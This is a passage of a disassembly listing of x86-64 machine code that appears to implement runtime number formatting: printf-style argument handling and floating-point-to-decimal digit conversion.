  407360:	49 83 c4 08          	add    $0x8,%r12
  407364:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407369:	e9 33 fc ff ff       	jmp    0x406fa1
  40736e:	49 8b 04 24          	mov    (%r12),%rax
  407372:	49 83 c4 08          	add    $0x8,%r12
  407376:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  40737b:	e9 6e fc ff ff       	jmp    0x406fee
  407380:	8b 94 24 94 00 00 00 	mov    0x94(%rsp),%edx
  407387:	49 83 c4 08          	add    $0x8,%r12
  40738b:	88 10                	mov    %dl,(%rax)
  40738d:	e9 7e f8 ff ff       	jmp    0x406c10
  407392:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
  407399:	00 00 00 00 
  40739d:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
  4073a4:	00 
  4073a5:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4073a9:	41 bd 02 00 00 00    	mov    $0x2,%r13d
  4073af:	e9 04 f9 ff ff       	jmp    0x406cb8
  4073b4:	83 e9 30             	sub    $0x30,%ecx
  4073b7:	41 89 0b             	mov    %ecx,(%r11)
  4073ba:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4073be:	e9 f5 f8 ff ff       	jmp    0x406cb8
  4073c3:	8b 94 24 94 00 00 00 	mov    0x94(%rsp),%edx
  4073ca:	49 83 c4 08          	add    $0x8,%r12
  4073ce:	66 89 10             	mov    %dx,(%rax)
  4073d1:	e9 3a f8 ff ff       	jmp    0x406c10
  4073d6:	49 63 04 24          	movslq (%r12),%rax
  4073da:	49 83 c4 08          	add    $0x8,%r12
  4073de:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  4073e3:	e9 b9 fb ff ff       	jmp    0x406fa1
  4073e8:	41 8b 04 24          	mov    (%r12),%eax
  4073ec:	49 83 c4 08          	add    $0x8,%r12
  4073f0:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  4073f5:	e9 f4 fb ff ff       	jmp    0x406fee
  4073fa:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
  4073fe:	c7 84 24 80 00 00 00 	movl   $0x10,0x80(%rsp)
  407405:	10 00 00 00 
  407409:	89 44 24 78          	mov    %eax,0x78(%rsp)
  40740d:	e9 4e f9 ff ff       	jmp    0x406d60
  407412:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  407417:	b9 25 00 00 00       	mov    $0x25,%ecx
  40741c:	48 89 f3             	mov    %rsi,%rbx
  40741f:	e8 fc e1 ff ff       	call   0x405620
  407424:	e9 e7 f7 ff ff       	jmp    0x406c10
  407429:	48 0f bf 44 24 60    	movswq 0x60(%rsp),%rax
  40742f:	49 89 d4             	mov    %rdx,%r12
  407432:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407437:	e9 65 fb ff ff       	jmp    0x406fa1
  40743c:	0f b7 54 24 60       	movzwl 0x60(%rsp),%edx
  407441:	49 89 c4             	mov    %rax,%r12
  407444:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
  407449:	e9 a0 fb ff ff       	jmp    0x406fee
  40744e:	45 85 ed             	test   %r13d,%r13d
  407451:	75 44                	jne    0x407497
  407453:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
  40745a:	00 
  40745b:	f7 5c 24 7c          	negl   0x7c(%rsp)
  40745f:	e9 92 fc ff ff       	jmp    0x4070f6
  407464:	48 63 94 24 94 00 00 	movslq 0x94(%rsp),%rdx
  40746b:	00 
  40746c:	49 83 c4 08          	add    $0x8,%r12
  407470:	48 89 10             	mov    %rdx,(%rax)
  407473:	e9 98 f7 ff ff       	jmp    0x406c10
  407478:	48 0f be 44 24 60    	movsbq 0x60(%rsp),%rax
  40747e:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407483:	e9 19 fb ff ff       	jmp    0x406fa1
  407488:	0f b6 44 24 60       	movzbl 0x60(%rsp),%eax
  40748d:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407492:	e9 57 fb ff ff       	jmp    0x406fee
  407497:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  40749e:	ff ff ff ff 
  4074a2:	49 89 d4             	mov    %rdx,%r12
  4074a5:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  4074a9:	45 31 db             	xor    %r11d,%r11d
  4074ac:	e9 07 f8 ff ff       	jmp    0x406cb8
  4074b1:	90                   	nop
  4074b2:	90                   	nop
  4074b3:	90                   	nop
  4074b4:	90                   	nop
  4074b5:	90                   	nop
  4074b6:	90                   	nop
  4074b7:	90                   	nop
  4074b8:	90                   	nop
  4074b9:	90                   	nop
  4074ba:	90                   	nop
  4074bb:	90                   	nop
  4074bc:	90                   	nop
  4074bd:	90                   	nop
  4074be:	90                   	nop
  4074bf:	90                   	nop
  4074c0:	41 57                	push   %r15
  4074c2:	41 56                	push   %r14
  4074c4:	41 55                	push   %r13
  4074c6:	41 54                	push   %r12
  4074c8:	55                   	push   %rbp
  4074c9:	57                   	push   %rdi
  4074ca:	56                   	push   %rsi
  4074cb:	53                   	push   %rbx
  4074cc:	48 81 ec c8 00 00 00 	sub    $0xc8,%rsp
  4074d3:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
  4074da:	00 
  4074db:	45 31 ff             	xor    %r15d,%r15d
  4074de:	48 89 cf             	mov    %rcx,%rdi
  4074e1:	41 89 d4             	mov    %edx,%r12d
  4074e4:	4d 89 c5             	mov    %r8,%r13
  4074e7:	41 8b 31             	mov    (%r9),%esi
  4074ea:	4c 89 cb             	mov    %r9,%rbx
  4074ed:	89 f0                	mov    %esi,%eax
  4074ef:	83 e0 cf             	and    $0xffffffcf,%eax
  4074f2:	41 89 01             	mov    %eax,(%r9)
  4074f5:	89 f0                	mov    %esi,%eax
  4074f7:	83 e0 07             	and    $0x7,%eax
  4074fa:	83 f8 04             	cmp    $0x4,%eax
  4074fd:	77 72                	ja     0x407571
  4074ff:	48 8d 15 4a 25 0d 00 	lea    0xd254a(%rip),%rdx        # 0x4d9a50
  407506:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  40750a:	48 01 c2             	add    %rax,%rdx
  40750d:	ff e2                	jmp    *%rdx
  40750f:	90                   	nop
  407510:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
  407514:	48 89 c6             	mov    %rax,%rsi
  407517:	80 fa 39             	cmp    $0x39,%dl
  40751a:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
  40751e:	0f 85 34 14 00 00    	jne    0x408958
  407524:	4c 39 f8             	cmp    %r15,%rax
  407527:	75 e7                	jne    0x407510
  407529:	41 83 c1 01          	add    $0x1,%r9d
  40752d:	41 c6 07 30          	movb   $0x30,(%r15)
  407531:	ba 31 00 00 00       	mov    $0x31,%edx
  407536:	45 8d 61 01          	lea    0x1(%r9),%r12d
  40753a:	88 10                	mov    %dl,(%rax)
  40753c:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  407542:	4c 89 f1             	mov    %r14,%rcx
  407545:	e8 86 1f 00 00       	call   0x4094d0
  40754a:	48 83 bc 24 48 01 00 	cmpq   $0x0,0x148(%rsp)
  407551:	00 00 
  407553:	48 8b 84 24 40 01 00 	mov    0x140(%rsp),%rax
  40755a:	00 
  40755b:	c6 06 00             	movb   $0x0,(%rsi)
  40755e:	44 89 20             	mov    %r12d,(%rax)
  407561:	74 0b                	je     0x40756e
  407563:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
  40756a:	00 
  40756b:	48 89 32             	mov    %rsi,(%rdx)
  40756e:	44 09 2b             	or     %r13d,(%rbx)
  407571:	0f 28 b4 24 b0 00 00 	movaps 0xb0(%rsp),%xmm6
  407578:	00 
  407579:	4c 89 f8             	mov    %r15,%rax
  40757c:	48 81 c4 c8 00 00 00 	add    $0xc8,%rsp
  407583:	5b                   	pop    %rbx
  407584:	5e                   	pop    %rsi
  407585:	5f                   	pop    %rdi
  407586:	5d                   	pop    %rbp
  407587:	41 5c                	pop    %r12
  407589:	41 5d                	pop    %r13
  40758b:	41 5e                	pop    %r14
  40758d:	41 5f                	pop    %r15
  40758f:	c3                   	ret
  407590:	8b 29                	mov    (%rcx),%ebp
  407592:	31 c9                	xor    %ecx,%ecx
  407594:	83 fd 20             	cmp    $0x20,%ebp
  407597:	7e 10                	jle    0x4075a9
  407599:	b8 20 00 00 00       	mov    $0x20,%eax
  40759e:	66 90                	xchg   %ax,%ax
  4075a0:	01 c0                	add    %eax,%eax
  4075a2:	83 c1 01             	add    $0x1,%ecx
  4075a5:	39 c5                	cmp    %eax,%ebp
  4075a7:	7f f7                	jg     0x4075a0
  4075a9:	e8 42 1e 00 00       	call   0x4093f0
  4075ae:	49 89 c6             	mov    %rax,%r14
  4075b1:	8d 45 ff             	lea    -0x1(%rbp),%eax
  4075b4:	4d 8d 4e 18          	lea    0x18(%r14),%r9
  4075b8:	c1 f8 05             	sar    $0x5,%eax
  4075bb:	48 98                	cltq
  4075bd:	4c 89 ca             	mov    %r9,%rdx
  4075c0:	4d 8d 44 85 00       	lea    0x0(%r13,%rax,4),%r8
  4075c5:	4c 89 e8             	mov    %r13,%rax
  4075c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4075cf:	00 
  4075d0:	8b 08                	mov    (%rax),%ecx
  4075d2:	48 83 c0 04          	add    $0x4,%rax
  4075d6:	89 0a                	mov    %ecx,(%rdx)
  4075d8:	48 83 c2 04          	add    $0x4,%rdx
  4075dc:	49 39 c0             	cmp    %rax,%r8
  4075df:	73 ef                	jae    0x4075d0
  4075e1:	4c 29 ca             	sub    %r9,%rdx
  4075e4:	48 c1 ea 02          	shr    $0x2,%rdx
  4075e8:	48 63 c2             	movslq %edx,%rax
  4075eb:	49 8d 44 86 14       	lea    0x14(%r14,%rax,4),%rax
  4075f0:	44 8b 00             	mov    (%rax),%r8d
  4075f3:	8d 4a ff             	lea    -0x1(%rdx),%ecx
  4075f6:	45 85 c0             	test   %r8d,%r8d
  4075f9:	0f 85 01 05 00 00    	jne    0x407b00
  4075ff:	48 83 e8 04          	sub    $0x4,%rax
  407603:	85 c9                	test   %ecx,%ecx
  407605:	89 ca                	mov    %ecx,%edx
  407607:	75 e7                	jne    0x4075f0
  407609:	41 c7 46 14 00 00 00 	movl   $0x0,0x14(%r14)
  407610:	00 
  407611:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
  407618:	00 
  407619:	4c 89 f1             	mov    %r14,%rcx
  40761c:	e8 ff 27 00 00       	call   0x409e20
  407621:	85 c0                	test   %eax,%eax
  407623:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  40762a:	45 89 e0             	mov    %r12d,%r8d
  40762d:	0f 85 ad 04 00 00    	jne    0x407ae0
  407633:	41 8b 4e 14          	mov    0x14(%r14),%ecx
  407637:	85 c9                	test   %ecx,%ecx
  407639:	0f 85 a1 00 00 00    	jne    0x4076e0
  40763f:	4c 89 f1             	mov    %r14,%rcx
  407642:	e8 89 1e 00 00       	call   0x4094d0
  407647:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
  40764e:	00 
  40764f:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
  407656:	00 
  407657:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40765d:	c7 01 01 00 00 00    	movl   $0x1,(%rcx)
  407663:	48 8d 0d e3 23 0d 00 	lea    0xd23e3(%rip),%rcx        # 0x4d9a4d
  40766a:	e8 61 19 00 00       	call   0x408fd0
  40766f:	49 89 c7             	mov    %rax,%r15
  407672:	e9 fa fe ff ff       	jmp    0x407571
  407677:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40767e:	00 00 
  407680:	48 8b 94 24 40 01 00 	mov    0x140(%rsp),%rdx
  407687:	00 
  407688:	48 8d 0d ba 23 0d 00 	lea    0xd23ba(%rip),%rcx        # 0x4d9a49
  40768f:	41 b8 03 00 00 00    	mov    $0x3,%r8d
  407695:	c7 02 00 80 ff ff    	movl   $0xffff8000,(%rdx)
  40769b:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
  4076a2:	00 
  4076a3:	e8 28 19 00 00       	call   0x408fd0
  4076a8:	49 89 c7             	mov    %rax,%r15
  4076ab:	e9 c1 fe ff ff       	jmp    0x407571
  4076b0:	48 8b 84 24 40 01 00 	mov    0x140(%rsp),%rax
  4076b7:	00 
  4076b8:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
  4076bf:	00 
  4076c0:	48 8d 0d 79 23 0d 00 	lea    0xd2379(%rip),%rcx        # 0x4d9a40
  4076c7:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  4076cd:	c7 00 00 80 ff ff    	movl   $0xffff8000,(%rax)
  4076d3:	e8 f8 18 00 00       	call   0x408fd0
  4076d8:	49 89 c7             	mov    %rax,%r15
  4076db:	e9 91 fe ff ff       	jmp    0x407571
  4076e0:	48 8d 94 24 ac 00 00 	lea    0xac(%rsp),%rdx
  4076e7:	00 
  4076e8:	4c 89 f1             	mov    %r14,%rcx
  4076eb:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
  4076f0:	e8 0b 24 00 00       	call   0x409b00
  4076f5:	8b 54 24 60          	mov    0x60(%rsp),%edx
  4076f9:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  4076ff:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
  407704:	4c 8b 5c 24 28       	mov    0x28(%rsp),%r11
  407709:	41 8d 44 10 ff       	lea    -0x1(%r8,%rdx,1),%eax
  40770e:	4c 89 da             	mov    %r11,%rdx
  407711:	45 89 da             	mov    %r11d,%r10d
  407714:	48 c1 ea 20          	shr    $0x20,%rdx
  407718:	f2 0f 2a c8          	cvtsi2sd %eax,%xmm1
  40771c:	81 e2 ff ff 0f 00    	and    $0xfffff,%edx
  407722:	41 89 c1             	mov    %eax,%r9d
  407725:	81 ca 00 00 f0 3f    	or     $0x3ff00000,%edx
  40772b:	41 c1 f9 1f          	sar    $0x1f,%r9d
  40772f:	48 89 d1             	mov    %rdx,%rcx
  407732:	48 c1 e1 20          	shl    $0x20,%rcx
  407736:	49 09 ca             	or     %rcx,%r10
  407739:	44 89 c9             	mov    %r9d,%ecx
  40773c:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
  407741:	31 c1                	xor    %eax,%ecx
  407743:	f2 0f 10 44 24 28    	movsd  0x28(%rsp),%xmm0
  407749:	44 29 c9             	sub    %r9d,%ecx
  40774c:	81 e9 35 04 00 00    	sub    $0x435,%ecx
  407752:	f2 0f 5c 05 0e 23 0d 	subsd  0xd230e(%rip),%xmm0        # 0x4d9a68
  407759:	00 
  40775a:	85 c9                	test   %ecx,%ecx
  40775c:	f2 0f 59 0d 1c 23 0d 	mulsd  0xd231c(%rip),%xmm1        # 0x4d9a80
  407763:	00 
  407764:	f2 0f 59 05 04 23 0d 	mulsd  0xd2304(%rip),%xmm0        # 0x4d9a70
  40776b:	00 
  40776c:	f2 0f 58 05 04 23 0d 	addsd  0xd2304(%rip),%xmm0        # 0x4d9a78
  407773:	00 
  407774:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
  407778:	7e 10                	jle    0x40778a
  40777a:	f2 0f 2a c9          	cvtsi2sd %ecx,%xmm1
  40777e:	f2 0f 59 0d 02 23 0d 	mulsd  0xd2302(%rip),%xmm1        # 0x4d9a88
  407785:	00 
  407786:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
  40778a:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
  40778e:	66 0f 57 f6          	xorpd  %xmm6,%xmm6
  407792:	66 0f 2e f0          	ucomisd %xmm0,%xmm6
  407796:	89 4c 24 68          	mov    %ecx,0x68(%rsp)
  40779a:	0f 87 e0 07 00 00    	ja     0x407f80
  4077a0:	89 c1                	mov    %eax,%ecx
  4077a2:	45 89 d1             	mov    %r10d,%r9d
  4077a5:	c7 84 24 94 00 00 00 	movl   $0x1,0x94(%rsp)
  4077ac:	01 00 00 00 
  4077b0:	c1 e1 14             	shl    $0x14,%ecx
  4077b3:	8d 14 11             	lea    (%rcx,%rdx,1),%edx
  4077b6:	48 c1 e2 20          	shl    $0x20,%rdx
  4077ba:	49 09 d1             	or     %rdx,%r9
  4077bd:	83 7c 24 68 16       	cmpl   $0x16,0x68(%rsp)
  4077c2:	4d 89 cb             	mov    %r9,%r11
  4077c5:	77 36                	ja     0x4077fd
  4077c7:	48 63 4c 24 68       	movslq 0x68(%rsp),%rcx
  4077cc:	48 8d 15 4d 23 0d 00 	lea    0xd234d(%rip),%rdx        # 0x4d9b20
  4077d3:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  4077d8:	f2 0f 10 4c 24 28    	movsd  0x28(%rsp),%xmm1
  4077de:	f2 0f 10 04 ca       	movsd  (%rdx,%rcx,8),%xmm0
  4077e3:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
  4077e7:	0f 86 b3 03 00 00    	jbe    0x407ba0
  4077ed:	83 6c 24 68 01       	subl   $0x1,0x68(%rsp)
  4077f2:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
  4077f9:	00 00 00 00 
  4077fd:	8b 54 24 60          	mov    0x60(%rsp),%edx
  407801:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
  407808:	00 00 00 00 
  40780c:	29 c2                	sub    %eax,%edx
  40780e:	83 ea 01             	sub    $0x1,%edx
  407811:	89 54 24 70          	mov    %edx,0x70(%rsp)
  407815:	0f 88 45 07 00 00    	js     0x407f60
  40781b:	8b 54 24 68          	mov    0x68(%rsp),%edx
  40781f:	85 d2                	test   %edx,%edx
  407821:	0f 88 79 07 00 00    	js     0x407fa0
  407827:	8b 54 24 68          	mov    0x68(%rsp),%edx
  40782b:	01 54 24 70          	add    %edx,0x70(%rsp)
  40782f:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
  407836:	00 00 00 00 
  40783a:	89 94 24 90 00 00 00 	mov    %edx,0x90(%rsp)
  407841:	83 bc 24 30 01 00 00 	cmpl   $0x9,0x130(%rsp)
  407848:	09 
  407849:	0f 87 d1 02 00 00    	ja     0x407b20
  40784f:	83 bc 24 30 01 00 00 	cmpl   $0x5,0x130(%rsp)
  407856:	05 
  407857:	0f 8e ce 02 00 00    	jle    0x407b2b
  40785d:	83 ac 24 30 01 00 00 	subl   $0x4,0x130(%rsp)
  407864:	04 
  407865:	31 c0                	xor    %eax,%eax
  407867:	83 bc 24 30 01 00 00 	cmpl   $0x3,0x130(%rsp)
  40786e:	03 
  40786f:	0f 84 ab 09 00 00    	je     0x408220
  407875:	0f 8f c5 02 00 00    	jg     0x407b40
  40787b:	83 bc 24 30 01 00 00 	cmpl   $0x2,0x130(%rsp)
  407882:	02 
  407883:	0f 84 fc 09 00 00    	je     0x408285
  407889:	f2 0f 2a c5          	cvtsi2sd %ebp,%xmm0
  40788d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  407892:	31 d2                	xor    %edx,%edx
  407894:	c7 84 24 98 00 00 00 	movl   $0x1,0x98(%rsp)
  40789b:	01 00 00 00 
  40789f:	c7 84 24 9c 00 00 00 	movl   $0xffffffff,0x9c(%rsp)
  4078a6:	ff ff ff ff 
  4078aa:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
  4078b1:	c7 84 24 38 01 00 00 	movl   $0x0,0x138(%rsp)
  4078b8:	00 00 00 00 
  4078bc:	f2 0f 59 05 cc 21 0d 	mulsd  0xd21cc(%rip),%xmm0        # 0x4d9a90
  4078c3:	00 
  4078c4:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
  4078c8:	83 c1 03             	add    $0x3,%ecx
  4078cb:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%rsp)
  4078d2:	88 54 24 48          	mov    %dl,0x48(%rsp)
  4078d6:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
  4078db:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
  4078e0:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
  4078e5:	e8 b6 16 00 00       	call   0x408fa0
  4078ea:	49 89 c7             	mov    %rax,%r15
  4078ed:	8b 47 0c             	mov    0xc(%rdi),%eax
  4078f0:	0f b6 54 24 48       	movzbl 0x48(%rsp),%edx
  4078f5:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
  4078fa:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
  4078ff:	4c 8b 5c 24 40       	mov    0x40(%rsp),%r11
  407904:	83 e8 01             	sub    $0x1,%eax
  407907:	83 f8 00             	cmp    $0x0,%eax
  40790a:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
  40790e:	74 20                	je     0x407930
  407910:	b8 02 00 00 00       	mov    $0x2,%eax
  407915:	0f 4d 44 24 6c       	cmovge 0x6c(%rsp),%eax
  40791a:	83 e6 08             	and    $0x8,%esi
  40791d:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
  407921:	74 0d                	je     0x407930
  407923:	b8 03 00 00 00       	mov    $0x3,%eax
  407928:	2b 44 24 6c          	sub    0x6c(%rsp),%eax
  40792c:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
  407930:	84 d2                	test   %dl,%dl
  407932:	0f 84 ed 02 00 00    	je     0x407c25
  407938:	8b 54 24 6c          	mov    0x6c(%rsp),%edx
  40793c:	0b 54 24 68          	or     0x68(%rsp),%edx
  407940:	0f 85 df 02 00 00    	jne    0x407c25
  407946:	8b b4 24 94 00 00 00 	mov    0x94(%rsp),%esi
  40794d:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  407952:	c7 84 24 ac 00 00 00 	movl   $0x0,0xac(%rsp)
  407959:	00 00 00 00 
  40795d:	f2 0f 10 64 24 28    	movsd  0x28(%rsp),%xmm4
  407963:	85 f6                	test   %esi,%esi
  407965:	74 12                	je     0x407979
  407967:	f2 0f 10 05 29 21 0d 	movsd  0xd2129(%rip),%xmm0        # 0x4d9a98
  40796e:	00 
  40796f:	66 0f 2e c4          	ucomisd %xmm4,%xmm0
  407973:	0f 87 b1 0e 00 00    	ja     0x40882a
  407979:	66 0f 28 c4          	movapd %xmm4,%xmm0
  40797d:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
  407984:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
  407988:	f2 0f 58 05 20 21 0d 	addsd  0xd2120(%rip),%xmm0        # 0x4d9ab0
  40798f:	00 
  407990:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  407996:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
  40799b:	4c 89 d0             	mov    %r10,%rax
  40799e:	41 83 e2 ff          	and    $0xffffffff,%r10d
  4079a2:	48 c1 e8 20          	shr    $0x20,%rax
  4079a6:	8d 80 00 00 c0 fc    	lea    -0x3400000(%rax),%eax
  4079ac:	48 c1 e0 20          	shl    $0x20,%rax
  4079b0:	49 09 c2             	or     %rax,%r10
  4079b3:	85 c9                	test   %ecx,%ecx
  4079b5:	0f 84 28 02 00 00    	je     0x407be3
  4079bb:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
  4079c2:	66 0f 28 cc          	movapd %xmm4,%xmm1
  4079c6:	45 31 c9             	xor    %r9d,%r9d
  4079c9:	8b 94 24 98 00 00 00 	mov    0x98(%rsp),%edx
  4079d0:	85 d2                	test   %edx,%edx
  4079d2:	0f 84 47 0b 00 00    	je     0x40851f
  4079d8:	8d 48 ff             	lea    -0x1(%rax),%ecx
  4079db:	48 8d 15 3e 21 0d 00 	lea    0xd213e(%rip),%rdx        # 0x4d9b20
  4079e2:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
  4079e7:	f2 0f 10 05 e1 20 0d 	movsd  0xd20e1(%rip),%xmm0        # 0x4d9ad0
  4079ee:	00 
  4079ef:	c7 84 24 ac 00 00 00 	movl   $0x0,0xac(%rsp)
  4079f6:	00 00 00 00 
  4079fa:	48 63 c9             	movslq %ecx,%rcx
  4079fd:	f2 0f 10 54 24 28    	movsd  0x28(%rsp),%xmm2
  407a03:	f2 0f 5e 04 ca       	divsd  (%rdx,%rcx,8),%xmm0
  407a08:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
  407a0c:	49 8d 77 01          	lea    0x1(%r15),%rsi
  407a10:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
  407a14:	f2 0f 2a d2          	cvtsi2sd %edx,%xmm2
  407a18:	83 c2 30             	add    $0x30,%edx
  407a1b:	41 88 17             	mov    %dl,(%r15)
  407a1e:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
  407a22:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
  407a26:	0f 87 92 00 00 00    	ja     0x407abe
  407a2c:	f2 0f 10 2d 64 20 0d 	movsd  0xd2064(%rip),%xmm5        # 0x4d9a98
  407a33:	00 
  407a34:	66 0f 28 d5          	movapd %xmm5,%xmm2
  407a38:	f2 0f 5c d1          	subsd  %xmm1,%xmm2
  407a3c:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
  407a40:	0f 87 d1 fa ff ff    	ja     0x407517
  407a46:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
  407a4d:	83 c2 01             	add    $0x1,%edx
  407a50:	39 c2                	cmp    %eax,%edx
  407a52:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
  407a59:	0f 8d bb 01 00 00    	jge    0x407c1a
  407a5f:	f2 0f 10 1d 39 20 0d 	movsd  0xd2039(%rip),%xmm3        # 0x4d9aa0
  407a66:	00 
  407a67:	eb 32                	jmp    0x407a9b
  407a69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407a70:	66 0f 28 d5          	movapd %xmm5,%xmm2
  407a74:	f2 0f 5c d1          	subsd  %xmm1,%xmm2
  407a78:	66 0f 2e c2          	ucomisd %xmm2,%xmm0
  407a7c:	0f 87 95 fa ff ff    	ja     0x407517
  407a82:	8b 94 24 ac 00 00 00 	mov    0xac(%rsp),%edx
  407a89:	83 c2 01             	add    $0x1,%edx
  407a8c:	39 d0                	cmp    %edx,%eax
  407a8e:	89 94 24 ac 00 00 00 	mov    %edx,0xac(%rsp)
  407a95:	0f 8e 7f 01 00 00    	jle    0x407c1a
  407a9b:	f2 0f 59 cb          	mulsd  %xmm3,%xmm1
  407a9f:	f2 0f 59 c3          	mulsd  %xmm3,%xmm0
  407aa3:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
  407aa7:	f2 0f 2a d2          	cvtsi2sd %edx,%xmm2
  407aab:	83 c2 30             	add    $0x30,%edx
  407aae:	88 16                	mov    %dl,(%rsi)
  407ab0:	48 83 c6 01          	add    $0x1,%rsi
  407ab4:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
  407ab8:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
  407abc:	76 b2                	jbe    0x407a70
  407abe:	66 0f 2e ce          	ucomisd %xmm6,%xmm1
  407ac2:	45 8d 61 01          	lea    0x1(%r9),%r12d
  407ac6:	7a 06                	jp     0x407ace
  407ac8:	0f 84 9d 09 00 00    	je     0x40846b
  407ace:	41 bd 10 00 00 00    	mov    $0x10,%r13d
  407ad4:	e9 69 fa ff ff       	jmp    0x407542
  407ad9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  407ae0:	89 c2                	mov    %eax,%edx
  407ae2:	4c 89 f1             	mov    %r14,%rcx
  407ae5:	e8 36 22 00 00       	call   0x409d20
  407aea:	8b 84 24 ac 00 00 00 	mov    0xac(%rsp),%eax
  407af1:	29 44 24 60          	sub    %eax,0x60(%rsp)
  407af5:	45 8d 04 04          	lea    (%r12,%rax,1),%r8d
  407af9:	e9 35 fb ff ff       	jmp    0x407633
  407afe:	66 90                	xchg   %ax,%ax
  407b00:	48 63 c9             	movslq %ecx,%rcx
  407b03:	41 89 56 14          	mov    %edx,0x14(%r14)
  407b07:	c1 e2 05             	shl    $0x5,%edx
  407b0a:	41 0f bd 44 8e 18    	bsr    0x18(%r14,%rcx,4),%eax
  407b10:	83 f0 1f             	xor    $0x1f,%eax
  407b13:	29 c2                	sub    %eax,%edx
  407b15:	89 54 24 60          	mov    %edx,0x60(%rsp)
  407b19:	e9 fb fa ff ff       	jmp    0x407619
  407b1e:	66 90                	xchg   %ax,%ax
  407b20:	c7 84 24 30 01 00 00 	movl   $0x0,0x130(%rsp)
  407b27:	00 00 00 00 
  407b2b:	05 fe 03 00 00       	add    $0x3fe,%eax
  407b30:	3d f7 07 00 00       	cmp    $0x7f7,%eax
  407b35:	0f 96 c0             	setbe  %al
  407b38:	e9 2a fd ff ff       	jmp    0x407867
  407b3d:	0f 1f 00             	nopl   (%rax)
  407b40:	83 bc 24 30 01 00 00 	cmpl   $0x4,0x130(%rsp)
  407b47:	04 
  407b48:	0f 84 e2 06 00 00    	je     0x408230
  407b4e:	83 bc 24 30 01 00 00 	cmpl   $0x5,0x130(%rsp)
  407b55:	05 
  407b56:	0f 85 2d fd ff ff    	jne    0x407889
  407b5c:	c7 84 24 98 00 00 00 	movl   $0x1,0x98(%rsp)
  407b63:	01 00 00 00 
  407b67:	8b 8c 24 38 01 00 00 	mov    0x138(%rsp),%ecx
  407b6e:	03 4c 24 68          	add    0x68(%rsp),%ecx
  407b72:	89 8c 24 9c 00 00 00 	mov    %ecx,0x9c(%rsp)
  407b79:	83 c1 01             	add    $0x1,%ecx
  407b7c:	85 c9                	test   %ecx,%ecx
  407b7e:	89 8c 24 88 00 00 00 	mov    %ecx,0x88(%rsp)
  407b85:	0f 8e 1f 09 00 00    	jle    0x4084aa
